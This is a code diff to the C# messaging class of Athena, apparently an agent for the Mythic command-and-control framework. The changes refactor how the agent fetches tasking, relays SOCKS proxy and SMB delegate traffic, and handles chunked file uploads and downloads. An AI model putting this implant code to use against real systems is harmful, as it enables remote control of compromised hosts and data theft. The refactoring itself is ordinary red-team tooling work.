@@ -1,16 +1,15 @@
-﻿using Athena.Commands.Model;
-using Athena.Config;
-using Athena.Mythic.Model;
-using Athena.Mythic.Model.Response;
-using Athena.Mythic.Model.Checkin;
+﻿using Athena.Config;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Net;
 using System.Threading.Tasks;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Tasks;
+using Athena.Models.Mythic.Response;
+using Athena.Models.Athena.Commands;
 
 namespace Athena
 {
@@ -62,17 +61,22 @@ namespace Athena
             {
                 action = "get_tasking",
                 tasking_size = -1,
-                delegates = Globals.delegateMessages ?? new List<DelegateMessage>(),
-                //socks = Globals.bagOut.Values.ToList() ?? new List<SocksMessage>(),
+                delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
+                //socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
                 socks = new List<SocksMessage>()
             };
             
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
-                
-                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString); Globals.delegateMessages.Clear();
-                //Globals.bagOut.Clear();
+
+                if (String.IsNullOrEmpty(responseString))
+                {
+                    return null;
+                }
+
+                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString); 
+
                 //This can be cleaned up.
                 if (gtr != null)
                 {
@@ -80,7 +84,7 @@ namespace Athena
                     {
                         foreach (var s in gtr.socks)
                         {
-                            Globals.bagIn.Add(s);
+                            Globals.socksHandler.AddToQueue(s);
                         }
                     }
 
@@ -88,7 +92,7 @@ namespace Athena
                     {
                         foreach(var del in gtr.delegates)
                         {
-                            Globals.outMessages.Add(del);
+                            Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
                         }
                     }
                     return gtr.tasks;
@@ -279,20 +283,23 @@ namespace Athena
                         break;
                 };
             }
-            List<SocksMessage> lm = Globals.bagOut.Reverse().ToList();
             PostResponseResponse prr = new PostResponseResponse()
             {
                 action = "post_response",
                 responses = lrr,
-                socks = lm ?? new List<SocksMessage>(),
-                delegates = Globals.delegateMessages ?? new List<DelegateMessage>()
+                socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
+                delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
             };
 
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
-                Globals.bagOut.Clear();
-                Globals.delegateMessages.Clear();
+
+                if (string.IsNullOrEmpty(responseString))
+                {
+                    return false;
+                }
+
                 if (responseString.Contains("chunk_data"))
                 {
                     PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
@@ -308,7 +315,7 @@ namespace Athena
                         {
                             foreach (var del in cs.delegates)
                             {
-                                Globals.outMessages.Add(del);
+                                Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
                             }
                         }
                         //Pass up socks messages
@@ -316,44 +323,52 @@ namespace Athena
                         {
                             foreach (var s in cs.socks)
                             {
-                                Globals.bagIn.Add(s);
+                                Globals.socksHandler.AddToQueue(s);
                             }
                         }
 
+                        //Handle Upload/Download Responses
                         foreach (var response in cs.responses)
                         {
                             //Spin off new thread to upload new chunks
-
                             if (!String.IsNullOrEmpty(response.chunk_data))
                             {
-                                //Spin up new task to handle uploads
+                                //Spin up new task to handle uploads/downloads
                                 Task.Run(() =>
                                 {
                                     try
                                     {
-                                        //Get upload and mythic job
-                                        MythicUploadJob uj = Globals.uploadJobs[response.task_id];
-                                        MythicJob job = Globals.jobs[response.task_id];
-                                        
-                                        //Get current upload values
-                                        uj.total_chunks = response.total_chunks;
-                                        uj.chunk_num = response.chunk_num;
-
-                                        //Make sure we're tracking the download properly.
-                                        if (!uj.chunkUploads.ContainsKey(response.chunk_num))
+                                        //Upload
+                                        if (Globals.uploadJobs.ContainsKey(response.task_id))
                                         {
-                                            //Lock the Dictionary<int,string>()
-                                            //I wonder if I could update this to use concurrent bag instead?
-                                            uj.locked = true;
-                                            uj.chunkUploads.Add(response.chunk_num, response.chunk_data);
+                                            //Get upload and mythic job
+                                            MythicUploadJob uj = Globals.uploadJobs[response.task_id];
+                                            MythicJob job = Globals.jobs[response.task_id];
 
-                                            //Unlock the Dictionary so that it can be written
-                                            uj.locked = false;
+                                            uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data), job);
+                                        }
+
+                                        //Download
+                                        else if (Globals.downloadJobs.ContainsKey(response.task_id))
+                                        {
+                                            if (!String.IsNullOrEmpty(response.file_id))
+                                            {
+                                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                                                if (string.IsNullOrEmpty(j.file_id))
+                                                {
+                                                    j.file_id = response.file_id;
+                                                    j.hasoutput = false;
+                                                }
+                                            }
                                         }
                                     }
-                                    catch
+                                    catch (Exception e)
                                     {
-
+                                        MythicJob job = Globals.jobs[response.task_id];
+                                        job.errored = true;
+                                        job.complete = true;
+                                        job.taskresult = e.Message;
+                                        job.hasoutput = true;
                                     }
                                 });
                                 
@@ -363,12 +378,6 @@ namespace Athena
                 }
                 else
                 {
-                    if (string.IsNullOrEmpty(responseString))
-                    {
-                        //We failed to get a response from the server
-                        return false;
-                    }
-
                     PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
 
                     //Check for socks messages to pass on
@@ -376,7 +385,7 @@ namespace Athena
                     {
                         foreach (var s in cs.socks)
                         {
-                            Globals.bagIn.Add(s);
+                            Globals.socksHandler.AddToQueue(s);
                         }
                     }
 
@@ -385,11 +394,12 @@ namespace Athena
                     {
                         foreach (var del in cs.delegates)
                         {
-                            Globals.outMessages.Add(del);
+                            Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
                         }
                     }
 
-                    //Check for socks messages to pass on
+                    //Todo Change this to make use of an object instead of trying to mess with threads. (Example how SOCKS is handled)
+                    //Check for file chunks to pass on
                     foreach (var response in cs.responses)
                     {
                         if (!String.IsNullOrEmpty(response.file_id))
@@ -406,7 +416,7 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                Misc.WriteDebug(e.Message);
                 return false;
             }
             return true;
